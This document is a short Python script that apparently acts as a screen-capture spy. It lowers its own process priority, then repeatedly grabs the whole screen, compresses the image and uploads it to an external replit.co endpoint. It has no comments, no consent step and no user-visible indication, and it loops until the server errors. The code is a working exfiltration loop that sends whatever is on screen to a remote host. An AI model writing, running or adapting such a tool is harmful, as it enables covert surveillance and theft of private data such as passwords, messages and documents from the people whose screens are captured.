import requests
import dxcam
import time
import cv2
import psutil
import os
from PIL import Image

def limit():
    p = psutil.Process(os.getpid())
    p.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
    
def takess():
    st = time.time()
    camera = dxcam.create()
    ss = camera.grab()
    rgb = cv2.cvtColor(ss, cv2.COLOR_BGR2RGB)
    cv2.imwrite("image.jpg", rgb)
    return time.time() - st

def compress():
    st = time.time()
    img = Image.open("image.jpg")
    img.save("image.jpg",optimize=True,quality=50)
    return time.time() - st

url = "https://scaredimpartialdeletions.ctih.repl.co/upload"
def send():
    st = time.time()
    with open("image.jpg","rb") as f:
        response = requests.post(url,files={"image":f})
    if int(response.status_code) == 500:
        return int(response.status_code)
    return time.time() - st

limit()

while True:
    print(takess())
    print(compress())
    if send() == 500:
        print("500")
        break
    
